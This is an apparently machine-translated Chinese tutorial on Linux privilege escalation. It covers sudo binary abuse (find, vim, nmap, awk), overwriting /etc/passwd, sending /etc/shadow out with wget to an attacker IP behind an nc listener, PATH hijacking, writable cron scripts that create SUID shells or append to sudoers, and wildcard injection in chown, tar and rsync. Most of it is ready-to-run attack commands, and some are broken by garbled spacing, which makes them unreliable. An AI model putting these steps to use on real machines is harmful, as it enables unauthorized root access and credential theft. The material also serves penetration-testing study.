上面的命令显示了允许当前用户使用的命令。
此处sudo -l，显示用户已允许以root用户身份执行所有此二进制文件而无需密码。
让我们一一查看所有二进制文件（仅在索引中提到）和将特权提升给root用户。
使用查找命令
sudo find / etc / passwd -exec / bin / sh \;
要么
sudo find / bin -name nano -exec / bin / sh \;
使用Vim命令
sudo vim -c'！sh'
使用Nmap命令
sudo nmap-交互式 
nmap>！sh 
sh-4.1＃
注意：nmap –interactive选项在最新的nmap中不可用。
没有互动的最新方式
echo“ os.execute（'/ bin / sh'）”> /tmp/shell.nse && sudo nmap --script = / tmp / shell.nse
使用Man命令
sudo man man
之后按！按下并按Enter
使用更少/更多命令
sudo less / etc / hosts
sudo more / etc / hosts
之后按！按下并按Enter
使用awk命令
 sudo awk'BEGIN {system（“ / bin / sh”）}'
使用nano命令
nano是使用此编辑器的文本编辑器，在您需要切换用户之后，您可以修改passwd文件并将用户添加为root特权。在/ etc / passwd中添加
此行，以将用户添加为root特权。
touhid：$ 6 $ bxwJfzor $ MUhUWO0MUgdkWfPPEydqgZpm.YtPMI / 
gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0：0：0：root：/ root：/ bin
sudo nano / etc / passwd
现在切换用户密码是：test
su touhid
使用wget命令
这种非常酷的方式要求Web服务器下载文件。这样我从没在任何地方见过。让我们解释一下。
在At客者一边。
首先将Target的/ etc / passwd文件复制到攻击者计算机。
修改文件，并在上一步中保存的密码文件中添加用户到攻击者计算机。
仅附加此行=>   touhid：$ 6 $ bxwJfzor $ MUhUWO0MUgdkWfPPEydqgZpm.YtPMI / 
gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0 / 0：b：root / root：
将passwd文件托管到使用任何Web服务器的主机。
在受害者方面。
sudo wget http://192.168.56.1:8080/passwd -O / etc / passwd
现在切换用户密码是：test
su touhid
注意：如果您要从服务器上转储文件，例如root的ssh密钥，shadow文件等。
sudo wget --post-file = / etc / shadow 192.168.56.1:8080
攻击者的设置侦听器：nc – lvp 8080
使用apache命令
但是，我们无法获得Shell和Cant编辑系统文件。
但是使用它 我们可以查看系统文件。
sudo apache2 -f / etc / shadow
输出是这样的：
Syntax error on line 1 of /etc/shadow: 
Invalid command 'root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0
可悲的是没有shell。但是我们可以现在提取root哈希，然后在破解了哈希。
有“.” 在PATH中表示用户可以从当前目录执行二进制文件/脚本。但是一些管理员为了避
免每次都必须输入这两个额外的字符，他们在用户中添加“。”在他们的PATH中。对于攻
击者而言，这是提升其特权的绝佳方法。
放置.路径
如果在PATH中放置点，则无需编写./binary即可执行它。那么我们将能够执行当前目录
中的任何脚本或二进制文件。
假设小明是管理员，而她添加了“。” 在她的PATH上，这样她就不必再输入两个字符了去
执行脚本或二进制文件。
发生这种情况是因为Linux首先在“.”位置搜索程序。但是添加到PATH的开头后，就在其他
任何地方搜索。
带“。” 在路径中–program
不带“。” 在路径中-./program
>另一个用户“小白”知道小明添加了“.” 在PATH中，
> 小白告诉小明'ls'命令在他的目录中不起作用
> 小白在他的目录中添加代码，这将更改sudoers文件并使他成为管理员
> 小白将该代码存储在名为“ ls”并使其可执行
> 小明具有root特权。她来了，并在小白的主目录中执行了'ls'命令
>恶意代码不是通过原始的'ls'命令而是通过root访问来执行
>在另存为“ ls”的文件中，添加了一个代码，该代码将打印“ Hello world”
$ PATH = .：$ {PATH} –添加'.' 在PATH变量中
1
2
1
2
3
4
5
6
7
1
$ ls –执行的./ls文件，而不是运行列表命令。
>现在，如果root用户以root特权执行代码，我们可以使用root特权实现任意代码执行。
1
2
3
如果未正确配置Cronjob，则可以利用该Cronjob获得root特权。
1. Cronjob中是否有可写的脚本或二进制文件？
2.我们可以覆盖cron文件本身吗？
3. cron.d目录可写吗？
Cronjob通常以root特权运行。如果我们可以成功篡改cronjob中
定义的任何脚本或二进制文件，那么我们可以以root特权执行任意
代码。
什么是Cronjob？
Cron Jobs被用于通过在服务器上的特定日期和时间执行命令来安排任务。它们最常用于
sysadmin任务，如备份或清理/tmp/目录等。Cron这个词来自crontab，它存在于/etc目
录中。 
例如：在crontab内部，我们可以添加以下条目，以每1小时自动打印一次apache错误日
志。
前五个数字值表示执行cronjob的时间。现在让我们了解五个数字值。
分钟–第一个值表示介于0到59之间的分钟范围，而*表示任何分钟。
小时–第二个值表示小时范围在0到24之间，*表示任何小时。
月中的某天–第三个值表示月中的某日，范围是1到31，*表示任何一天。
月–第四个值表示1到12之间的月份范围，*表示任何月份。
星期几–第五个值表示从星期天开始的星期几，介于0到6之间，*表示星期几。
简而言之呢，crontab就是一个自定义定时器。
Cron特权升级概述
cron守护程序计划在指定的日期和时间运行命令。它与特定用户一起运行命令。因此，我们可以尝试
滥用它来实现特权升级。
滥用cron的一个好方法是，
1.检查cron运行的脚本的文件权限。如果权限设置不正确，则攻击者可能会覆盖文件并轻松获取cron
中设置的用户权限。
2.另一种方法是使用通配符技巧
Cron信息收集
一些基本命令收集一些线索，以使用错误配置的cron实现特权升级。
具有特权的运行脚本，其他用户可以编辑该脚本。
查找特权用户拥有但可写的任何内容：
crontab -l 
ls -alh /var/spool/cron 
ls -al /etc/ | grep cron 
ls -al /etc/cron* 
cat /etc/cron* 
1
1 0 * * * printf “” > /var/log/apache/error_log
命令
结果
crontab -l
显示当前用户的cron
ls -la /etc/cron*
显示计划的作业概述
cat /etc/at.allow 
cat /etc/at.deny 
cat /etc/cron.allow 
cat /etc/cron.deny 
cat /etc/crontab 
cat /etc/anacrontab 
cat /var/spool/cron/crontabs/root
查看其他用户的crontab
$ crontab -u tstark -l 
0 0 * * * / jarvis / reboot-arc-reactor
如果服务器上有很多用户，那么可以在cron日志中看到详细信息，可能包含用户名。
例如，在这里我可以看到运行数据库备份脚本的ubuntu用户：
8月5日4:05:01 dev01 CRON [2128]：（ubuntu）CMD（/var/cronitor/database-backup.sh）
使用pspy工具（32位为pspy32，64位为pspy64）。
下载链接：https : //github.com/DominicBreuker/pspy
利用配置错误的cronjob获得root访问权限
1 $ ls -la /etc/cron.d –输出cron.d中已经存在的cronjob
我们知道cron-lograte.sh是可写的，它由logrotate cronjob运行。
那么我们在cron-lograte.sh中编写/附加的任何命令都将以“ root”身份执行。
我们在/ tmp目录中编写一个C文件并进行编译。
 rootme可执行文件将生成一个shell。
find / -perm -2 -type f 2> / dev / null –输出可写文件
ls -la /usr/local/sbin/cron-logrotate.sh –让我们确认cron-logrotate.sh是否可写。
$ ls -la rootme –它告诉我们它是由用户'SHayslett'拥有的
1
1
1
Cron脚本覆盖和符号链接
如果可以修改由root执行的cron脚本，则可以非常轻松地获取shell：
$ echo“ chown root：root / tmp / rootme; chmod u + s /tmp/rootme;”>/usr/local
$ ls -la rootme – 5分钟后，运行了logrotate cronjob，并以root特权执行了cron-logro
$ ./rootme –生成一个root shell。
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > 
#Wait until it is executed
1
1
1
1
2
＃等待执行
如果root用户执行的脚本使用具有完全访问权限的目录，则删除该文件夹并创建一个
符号链接文件夹到另一个服务于您控制的脚本的文件夹可能会很有用。
定时任务
可以监视进程以搜索每1,2或5分钟执行的进程。可以利用它并提升特权。
例如，要在1分钟内每隔0.1s监视一次，按执行次数较少的命令排序并删除一直执行
的命令，可以执行以下操作：
总结
由于Cron在执行时以root身份运行/etc/crontab，因此crontab调用的任何命令或脚本也将以root身
份运行。当Cron执行的脚本可由非特权用户编辑时，那些非特权用户可以通过编辑此脚本并等待
Cron以root特权执行该脚本来提升其特权！
例如，假设下面的行在中/etc/crontab。每天晚上9：30，Cron运行maintenance.shshell脚本。该
脚本在root特权下运行。
30 21 * * * root /path/to/maintenance.sh
/tmp/bash -p
/ tmp / bash -p
ln -d -s  
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1;
3
1
1
1
现在让我们说该maintenance.sh脚本还可以由所有人编辑，而不仅仅是root用户。在这种情况下，
任何人都可以将命令添加到maintenance.sh，并使该命令由root用户执行！
这使得特权升级变得微不足道。例如，攻击者可以通过将自己添加为Sudoer来向自己授予超级用户特
权。
echo "vickie ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
或者，他们可以通过将新的root用户添加到“ / etc / passwd”文件来获得root访问权限。由于“
0”是root用户的UID，因此添加UID为“ 0”的用户将为该用户提供root特权。该用户的用户名为“
vickie”，密码为空：
echo "vickie::0:0:System Administrator:/root/root:/bin/bash" >> /etc/passwd
等等。
通配符是代表其他字符的符号。您可以将它们与任何命令（例如cat或rm命令）一
起使用，以列出或删除符合给定条件的文件。还有其他一些，但是现在对我们很重
要的一个是*字符，它可以匹配任意数量的字符。
例如：
cat * 显示当前目录中所有文件的内容
rm * 删除当前目录中的所有文件
它的工作原理是将*角色扩展到所有匹配的文件。如果我们有文件a，b并且c在当前
目录中并运行rm *，则结果为rm a b c。
原理
众所周知，我们可以在命令行中将标志传递给程序以指示其应如何运行。例如，如
果我们使用rm -rf而不是，rm那么它将递归并强制删除文件，而无需进一步提
示。
现在，如果我们运行rm *并在当前目录中有一个名为name的文件，将会发生什么-
rf？*的Shell扩展将导致命令变为，rm -rf a b c并且-rf将被解释为命令参数。
当特权用户或脚本在具有潜在危险标志的命令中使用通配符时，尤其是与外部命令
执行相关的通配符，这是一个坏消息。在这些情况下，我们可能会使用它来升级特
权。
chown和chmod
chown和chmod都可以用相同的方式利用，因此我只看看chown。
Chown是一个程序，可让您更改指定文件的所有者。以下示例将some-file.txt的所
有者更改为some-user：
chown some-user some-file.txt
Chown具有一个--reference=some-reference-file标志，该标志指定文件的所
有者应与参考文件的所有者相同。一个例子应该有帮助：
chown some-user some-file.txt --reference=some-reference-file
假设的所有者some-reference-file是another-user。在这种情况下，所有者
some-file.txt将another-user代替some-user。
利用
假设我们有一个名为弱势程序的脆弱程序，其中包含以下内容：
cd some-directory 
chown root *
在这种情况下，让我们创建一个我们拥有的文件：
cd some-directory  
touch reference
然后我们创建一个文件，将注入标记：
touch -- --reference=reference
如果在同一目录中创建到/ etc / passwd的符号链接，则/ etc / passwd的所有者
也将是您，这将使您获得root shell。
其他
TAR
Tar是一个程序，可让您将文件收集到存档中。
在tar中，有“检查点”标志，这些标志使您可以在归档指定数量的文件后执行操作。
由于我们可以使用通配符注入来注入那些标志，因此我们可以使用检查点来执行我
们选择的命令。如果tar以root用户身份运行，则命令也将以root用户身份运行。
鉴于存在此漏洞，获得root用户特权的一种简单方法是使自己成为sudoer。sudoer
是可以承担root特权的用户。这些用户在/etc/sudoers文件中指定。只需在该文
件上追加一行，我们就可以使自己变得更轻松。
利用
假设我们有一个易受攻击的程序，并且使用cron定期运行该程序。该程序包含以下
内容：
cd important-directory 
tar cf /var/backups/backup.tar *
进行根访问的步骤如下：
1）注入一个标志来指定我们的检查点
首先，我们将指定在归档一个文件之后，有一个检查点。稍后我们将对该检查点执
行操作，但是现在我们仅告诉tar它存在。
让我们创建一个将注入标记的文件：
cd important-directory 
touch -- --checkpoint=1
2）编写恶意的Shell脚本
Shell脚本将/etc/sudoers在其后追加代码，这会使您变得更加无礼。
您需要添加到的行/etc/sudoers是my-user ALL=(root) NOPASSWD: ALL。
让我们创建shell脚本：
echo 'echo "my-user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > 
demo.sh
Shell脚本应与通配符位于同一目录中。
请注意，我们将必须更改my-user为要成为sudoer的实际用户。
3）注入一个指定检查点动作的标志
现在，我们将指定，当tar到达在步骤＃1中指定的检查点时，它应运行在步骤＃2中
创建的shell脚本：
touch -- "--checkpoint-action=exec=sh demo.sh"
4）root
等待，直到cron执行了脚本并通过键入以下内容获得root特权：
sudo su
rsync
Rsync是“快速，通用，远程（和本地）文件复制工具”，在linux系统上非常常见。
与rsync一起使用的一些有趣的标志是：
 -e, --rsh=COMMAND           specify the remote shell to use 
     --rsync-path=PROGRAM    specify the rsync to run on remote machine
我们可以使用该-e标志来运行所需的任何Shell脚本。让我们创建一个shell脚本，它
将我们添加到sudoers文件中：
echo 'echo "my-user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > 
shell.sh
现在让我们注入将运行我们的shell脚本的标志：
touch -- "-e sh shell.sh"